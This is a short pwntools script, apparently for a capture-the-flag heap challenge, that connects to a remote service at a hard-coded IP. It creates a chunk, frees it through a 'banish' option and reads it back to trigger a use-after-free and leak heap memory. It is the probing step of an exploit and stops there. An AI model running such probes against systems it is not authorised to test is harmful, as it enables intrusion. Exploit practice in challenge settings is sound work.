#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'debug'

def connect():
    return remote('52.76.96.108', 9005)

p = connect()
# Read the banner
data = p.recvuntil(b'> ')
print("=== BANNER ===")
print(data.decode(errors='replace'))

# Send menu choice 1 (create)
p.sendline(b'1')
data = p.recvuntil(b'index: ')
print("After menu choice 1:", data)

# Send index 0
p.sendline(b'0')
data = p.recvuntil(b'size: ')
print("After index:", data)

# Send size 16
p.sendline(b'16')
data = p.recvuntil(b'data: ')
print("After size:", data)

# Send data
p.sendline(b'AAAA')
data = p.recvuntil(b'> ')
print("After data:", data)

# Recite
p.sendline(b'4')
data = p.recvuntil(b'index: ')
print("After recite menu:", data)

p.sendline(b'0')
data = p.recvuntil(b'data: ')
print("After recite index:", data)

data = p.recvuntil(b'\n')
print("Recited data:", data)

# Banish
p.sendline(b'3')
data = p.recvuntil(b'index: ')
print("After banish menu:", data)

p.sendline(b'0')
data = p.recvuntil(b'> ')
print("After banish:", data)

# Recite after banish (UAF)
p.sendline(b'4')
data = p.recvuntil(b'index: ')
print("After recite2 menu:", data)

p.sendline(b'0')
data = p.recvuntil(b'data: ')
print("After recite2 index:", data)

data = p.recvuntil(b'\n')
print("Recited data after banish:", data)
print("Hex:", data.hex())

p.close()
